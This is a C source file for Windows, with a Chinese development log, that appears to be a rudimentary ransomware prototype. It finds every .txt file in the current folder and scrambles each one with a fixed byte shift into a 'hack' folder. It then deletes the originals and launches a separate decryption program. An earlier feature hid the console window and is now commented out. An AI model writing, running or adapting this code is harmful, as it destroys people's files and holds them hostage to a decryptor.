/*
日期:2020/12/4 
作者:于京平 
內容:視窗隱藏、資料夾內的是txt檔名的檔案搜索。

日期:2020/12/6
作者:于京平 
內容:刪除隱藏視窗的功能、解決隱藏檔案後會無法結束後台程式的惡性BUG(BUG-001)、完成讀取要加密檔案的功能、精簡了語法、基礎加密程序完成、解密程序製作中。

日期：2020/12/12
作者：于京平
內容：beta程式製作完成，發現Bug-002(如果檔案名有空格的話無法加密)已解決。
*/
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#define _WIN32_WINNT_WIN32_WINNIT_WINN2K 0x0500
#include <windows.h>

void txt_file(void){
  //創建資料夾和所有txt檔的檔名 
  system("dir /B *.txt >> hack/hack.txt");
}

char encryption(FILE *fptr1, FILE *fptr2){
  char ch;
  while(1)
    {
        ch = fgetc(fptr1);
        if(ch == EOF)
        {
            break;
        }
        else
        {
            ch = ch - (8 * 5 - 3);
            fputc(ch, fptr2);
        }
    }
}

void file_read_hackTXT(void){
  //讀取 
  FILE *fptr1, *fptr2;//1:要加密的檔案、2:加密文字放的檔案
  char file1[1000];
  
  while(1){
    txt_file();
    fptr1 = fopen("hack/hack.txt", "r");
    fgets(file1, 1000, fptr1);
    strtok(file1, "\n");
    fclose(fptr1);
    remove("hack/hack.txt");
    fptr1 = fopen(file1, "r");
    if(fptr1 == NULL){//檢測檔案是否存在
      break;
    }
    char file2[1000] = "hack/";
    strcat(file2, file1);
    fptr2 = fopen(file2, "w");
    encryption(fptr1, fptr2);
    fclose(fptr1);
    fclose(fptr2);
    remove(file1);
  }
}

int main(void){
  //視窗隱藏 
  /*HWND hwnd = GetConsoleWindow();
  ShowWindow(hwnd, SW_MINIMIZE);
  ShowWindow(hwnd, SW_HIDE);*/
  
  //主程式
  system("md hack");
  file_read_hackTXT();

  system("cls");
  system("decryption_program.exe");
  system("pause");
  return 0;
}
